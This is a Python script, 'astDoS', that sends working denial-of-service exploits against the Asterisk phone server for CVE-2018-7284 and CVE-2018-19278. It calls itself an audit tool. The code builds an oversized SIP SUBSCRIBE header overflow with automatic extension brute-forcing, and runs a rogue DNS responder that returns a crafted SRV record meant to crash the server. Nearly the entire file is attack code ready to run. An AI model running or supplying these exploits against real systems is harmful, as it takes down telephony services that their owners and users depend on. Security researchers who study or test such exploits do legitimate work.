#!/usr/bin/env python
import argparse
args=argparse.Namespace()
args.suppress=None
args.store=None

import socket
import uuid
import re
import hashlib
import time
import sys
import binascii
#from StringIO import StringIO


def overflowDNS(localIP, localPort):
	
	#DNS SRV response fields
	flags = "8580"
	questions = "0001"
	answerRR = "0002"
	authorityRR = "0001"
	additionalRR = "0001"

	#Create UDP socket
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	#Bind port and address
	address = (localIP, localPort)
	sock.bind(address)

	sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)

	while True:
		data,address= sock.recvfrom(10240)
		if "sip" in data:
			if "udp" in data:
				hexdata = binascii.hexlify(data).decode()

				host = address[0]
				port = address[1]
				xid = hexdata[:4]
				#Find end of query section
				offset = hexdata.find('00210001')
				#Calculate the offset
				offset += 8
				query1 = hexdata[24:offset]
				diff = (offset - 88) / 2
				offsetCalculated = 76 + diff
				hexCalculated = str(hex(offsetCalculated))
				hexreduced = hexCalculated[2:]
				if len(hexreduced) == 2:
					hexOffset = "0" + hexreduced

				answer = "c00c0021000100000145003d000a000013c4047465737408617374657269736b0a303132333435363738390c6161616161616161616161610c62626262626262626262626202657300c00c002100010000014500170014000013c405636865636b08636f6d7072657373c" + hexOffset
				authoritativeNS = "c0160002000100000028000a04746573740365647500"
				aditionalRecords = "0000291000000000000000"

				#Create the message
				hexmsg = xid + flags + questions + answerRR + authorityRR + additionalRR + query1
				hexmsg += answer + authoritativeNS + aditionalRecords
				msg = hexmsg.decode('hex')

				#Send the message
				sock.sendto(msg,(host,port))

				print_debug("\nDNS message sent!\n      Check if Asterisk server is down\n")

		print ".",





def autoHeaders(serverIP, serverPortInt):

	list_most_used_extensions = [ range(1000, 1100), range(2000, 2100), range(3000, 3100)]

	listLength = len(list_most_used_extensions)
	
	for i in range(listLength):
		for ext in list_most_used_extensions[i]:
			extSTR = str(ext)
			#print_debug extSTR
			result = overflowHeaders(serverIP, serverPortInt, extSTR, extSTR, extSTR)
			if result:
				print_result("The attack was succesfully with extension " + extSTR + "\n")
				sys.exit(0)
			time.sleep(1)

def overflowHeaders(serverIP, serverPortInt, user, passwd, subscribeUser):

	#Port in string format
	serverPort = str(serverPortInt)
	
	#Local IP
	hostname = socket.gethostname()
	localIP = socket.gethostbyname(hostname)
	
	#Caller identification
	callid = str(uuid.uuid4())
	#Subscribe message to be sent
	message = "SUBSCRIBE sip:" + subscribeUser + "@" + serverIP + ":" + serverPort + " SIP/2.0\r\n" \
			"Via: SIP/2.0/TCP " + localIP + ":21867;branch=z9hG4bKtrxftxslfcy3aagf3c9s7\r\n" \
			"From: TestUser <sip:" + user + "@" + serverIP + ":" + serverPort + ">\r\n" \
			"To: <sip:" + subscribeUser + "@" + serverIP + ":" + serverPort + ">\r\n" \
			"Call-Id: " + callid + "\r\n" \
			"CSeq: 1 SUBSCRIBE\r\n" \
			"Contact: <sip:" + user + "@" + localIP + ">\r\n"

	for _ in range(32):
		message += "Accept: " + ("A" * 64) + "\r\n"
	
	#Accept header that exploits the buffer overflow
	message += "Accept: " + ("B" * 64) + "\r\n" \
			"Allow: INVITE, CANCEL, BYE, ACK, REGISTER, OPTIONS, REFER, SUBSCRIBE, NOTIFY, MESSAGE, INFO, PRACK, UPDATE\r\n" \
			"Event: message-summary\r\n" \
			"Expires: 240\r\n" \
			"Content-Length: 0\r\n" \
			"\r\n"

	#Create UDP socket
	sockt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	#Create the connection to Asterisk
	sockt.connect((serverIP, serverPortInt))
	#Send message to asterisk
	sockt.settimeout(None)
	sockt.sendall(message)
	
	try:
		#Receive data from Asterisk
		sockt.settimeout(3)
		receivedData = sockt.recv(10240)
	except socket.timeout:
		print_debug("\nAsterisk server is not answering our subscription request. Is the address correct?")
		return False
	
	#print(receivedData);

	#Loop to create the Authorization Header
	for line in receivedData.splitlines():
		if line.startswith("WWW-Authenticate:"):
			realmReceived = re.search("realm=\"([a-z]+)\"", line).group(1)
			nonceReceived = re.search("nonce=\"([0-9a-z\/]+)\"", line).group(1)
			r1 = hashlib.md5(user + ":" + realmReceived + ":" + passwd)
			sipUri = "sip:" + serverIP + ":" + serverPort
			r2 = hashlib.md5("SUBSCRIBE:" + sipUri)
			response = hashlib.md5(r1.hexdigest() + ":" + nonceReceived + ":" + r2.hexdigest())
			hexResponse = response.hexdigest()

			authorizationHeader = "UPDATE \r\nAuthorization: Digest username=\"" + user + "\",uri=\"" + sipUri + "\"," \
				"nonce=\"" + nonceReceived + "\",realm=\"" + realmReceived + "\",response=\"" + hexResponse + "\",algorithm=md5"
			#Message with authorization header
			authMessage = message.replace("UPDATE", authorizationHeader)

	#Send authenticated message
	sockt.settimeout(None)
	sockt.sendall(authMessage)
	
	sockt.settimeout(3)
	try:
		sockt.recv(10240)
	except socket.timeout:
		return True
	
	return False    


def print_debug(string):
    sys.stderr.write(string.encode('utf8'))


def print_result(string):
    sys.stdout.write(string.encode('utf8'))
    #return

def main(args):

	try:
		if (args.version or len(sys.argv) < 1):
			print_debug("\nastDoS v1.0\nAudit tool to check if Asterisk is vulnerable to CVE-2018-7284 (headers) and CVE-2018-19278 (DNS)\n")
			sys.exit(0)

		if args.attack==1:
			
			if not args.server_ip:
				print_debug("\nAttack type CVE-2018-7284\n    At least you must provide Asterisk IP\n")
				sys.exit(1)
			
			if args.user:
				if args.passwd:
					if args.subUser:
						result = overflowHeaders(args.server_ip, args.server_port, args.user, args.passwd, args.subUser)
						if result:
							print_debug("\nCongratulations, the attack has been succesfully.\nThe server should not be available.\n")
							exit(1)
						else:
							print_debug("\nThe attack has not been succesfully. Try again with other parameters.\n")
							sys.exit(1)
					else:
						print_debug("\nIf parameters user and password are provided, then subscribeUser must also be provided\n")
						sys.exit(1)
				else:
					print_debug("\nIf parameter user is provided, then password and subscribeUser must also be provided\n")
					sys.exit(1)
			else:
				if args.passwd:
					print_debug("\nIf parameter password is provided, then user and subscribeUser must also be provided\n")
					sys.exit(1)
				elif args.subUser:
					print_debug("\nIf parameter subscribeUser is provided, then user and password must also be provided\n")
					sys.exit(1)
				else:				
					autoHeaders(args.server_ip, args.server_port)
					
		else:
			if not args.dns_ip:
				print_debug("Attack type CVE-2018-19278\n    You must specified an IP address to create the socket.")
				sys.exit(1)
			
			overflowDNS (args.dns_ip, args.dns_port)
	

	except (KeyboardInterrupt):
		print_debug("\n\nAttack stopped.\n")


if __name__ == '__main__':
	
	parser = argparse.ArgumentParser(description='DoS attack against Astersisk, CVE-2018-7284 and CVE-2018-19278')
	
	parser.add_argument('-a', '--attack',  dest='attack', type=int, choices=[1, 2], default=1, help='Attack type. 1 for CVE-2018-7284 header (default value). 2 for CVE-2018-19278 DNS')

	#parameters for attack CVE-2018-7284 headers
	parser.add_argument('-sA', '--server-address', dest='server_ip', type=str, help='CVE-2018-7284 headers: Asterisk IP address to connect to')
	parser.add_argument('-sP', '--server-port',  dest='server_port', type=int, default=5060, help='CVE-2018-7284 headers: Astersik port to connect to (5060 by default)')	
	parser.add_argument('-u', '--user', dest='user', type=str, help='CVE-2018-7284 headers: username to use in the attack')
	parser.add_argument('-p', '--password', dest='passwd', type=str, help='CVE-2018-7284 headers: password to use in the attack')
	parser.add_argument('-sub', '--subscribeUser', dest='subUser', type=str, help='CVE-2018-7284 headers: subscribe user to use in the attack')

	#parameters for attack CVE-2018-19278 DNS
	parser.add_argument('-dA', '--dns-address', dest='dns_ip', type=str, help='CVE-2018-19278 DNS: Address to bind the socket')
	parser.add_argument('-dP', '--dns-port', dest='dns_port', type=int, default=53, help='CVE-2018-19278 DNS: Port to bind the socket')

	parser.add_argument('-v', '--version', dest='version', nargs='?', const=True, help='Show tool version.')



	main (parser.parse_args())


